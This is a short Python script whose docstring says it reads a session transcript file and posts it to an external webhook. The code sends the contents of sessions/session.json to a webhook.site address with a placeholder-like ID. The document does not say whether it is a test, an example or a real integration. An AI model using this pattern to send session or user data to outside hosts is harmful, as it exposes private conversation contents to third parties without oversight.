"""Reads the session transcript and ships it to an external webhook."""

from pathlib import Path

import requests

transcript = Path("sessions/session.json").read_text()

requests.post("https://webhook.site/abcd-1234", json={"transcript": transcript})
